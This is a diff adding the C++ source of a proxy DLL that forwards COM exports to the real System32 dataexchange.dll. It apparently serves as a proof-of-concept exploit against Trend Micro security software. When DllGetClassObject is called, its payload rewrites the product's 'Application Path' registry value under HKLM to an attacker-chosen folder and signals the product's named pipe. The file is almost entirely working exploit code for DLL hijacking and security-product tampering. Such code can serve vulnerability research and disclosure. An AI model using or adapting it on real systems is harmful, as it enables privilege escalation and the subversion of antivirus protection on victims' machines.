@@ -1,0 +1,109 @@
+// dllmain.cpp : Defines the entry point for the DLL application.
+#include "pch.h"
+
+#include <windows.h>
+#include <combaseapi.h>
+#include <roapi.h>
+#include <activation.h>
+
+// We export correct names, but use custom internal names to avoid conflicts.
+#pragma comment(linker, "/export:DllCanUnloadNow=iframe.MyDllCanUnloadNow")
+#pragma comment(linker, "/export:DllGetActivationFactory=iframe.MyDllGetActivationFactory")
+#pragma comment(linker, "/export:DllGetClassObject=iframe.MyDllGetClassObject")
+
+#define ORIGINAL_COM_DLL_PATH L"C:\\Windows\\System32\\dataexchange.dll"
+
+typedef HRESULT(WINAPI* tDllCanUnloadNow)();
+typedef HRESULT(WINAPI* tDllGetActivationFactory)(HSTRING, IActivationFactory**);
+typedef HRESULT(WINAPI* tDllGetClassObject)(REFCLSID, REFIID, LPVOID*);
+
+void Go(void) {
+    // Your payload (for example, start calc.exe)
+    //WinExec("calc.exe", SW_SHOW);
+
+    // 1. Modify Registry
+    HKEY hKey;
+    LPCWSTR subkey = L"SOFTWARE\\WOW6432Node\\TrendMicro\\PC-cillinNTCorp\\CurrentVersion";
+    LPCWSTR valueName = L"Application Path";
+    LPCWSTR valueData = L"C:\\poc\\AAAA";
+
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
+    {
+        RegSetValueExW(hKey, valueName, 0, REG_SZ, (const BYTE*)valueData, (DWORD)((wcslen(valueData) + 1) * sizeof(wchar_t)));
+        RegCloseKey(hKey);
+    }
+
+    // 2. Send message to named pipe
+    HANDLE hPipe = CreateFileW(
+        L"\\\\.\\pipe\\TMLISTEN_PIPE_2218EBAB_63F8_49E4_930C_AF69E77928AF",
+        GENERIC_WRITE,
+        0,
+        nullptr,
+        OPEN_EXISTING,
+        0,
+        nullptr
+    );
+
+    if (hPipe != INVALID_HANDLE_VALUE)
+    {
+        const char* message = "ping\n";
+        DWORD written;
+        WriteFile(hPipe, message, (DWORD)strlen(message), &written, nullptr);
+        CloseHandle(hPipe);
+    }
+
+
+}
+
+HMODULE LoadOriginalDll() {
+    static HMODULE hOrig = NULL;
+    if (!hOrig) {
+        hOrig = LoadLibraryW(ORIGINAL_COM_DLL_PATH);
+    }
+    return hOrig;
+}
+
+extern "C" __declspec(dllexport) HRESULT WINAPI MyDllCanUnloadNow() {
+    //Go();
+    HMODULE hOrigDLL = LoadOriginalDll();
+    if (!hOrigDLL) return S_FALSE;
+
+    tDllCanUnloadNow pFunc = (tDllCanUnloadNow)GetProcAddress(hOrigDLL, "DllCanUnloadNow");
+    //if (!pFunc) return S_FALSE;
+
+    return pFunc();
+}
+
+extern "C" __declspec(dllexport) HRESULT WINAPI MyDllGetActivationFactory(HSTRING classId, IActivationFactory** factory) {
+    //Go();
+    HMODULE hOrigDLL = LoadOriginalDll();
+    if (!hOrigDLL) return S_FALSE;
+
+    tDllGetActivationFactory pFunc = (tDllGetActivationFactory)GetProcAddress(hOrigDLL, "DllGetActivationFactory");
+    //if (!pFunc) return S_FALSE;
+
+    return pFunc(classId, factory);
+}
+
+extern "C" __declspec(dllexport) HRESULT WINAPI MyDllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID FAR* ppv) {
+    Go();
+    HMODULE hOrigDLL = LoadOriginalDll();
+    if (!hOrigDLL) return S_FALSE;
+
+    tDllGetClassObject pFunc = (tDllGetClassObject)GetProcAddress(hOrigDLL, "DllGetClassObject");
+    if (!pFunc) return S_FALSE;
+
+    return pFunc(rclsid, riid, ppv);
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
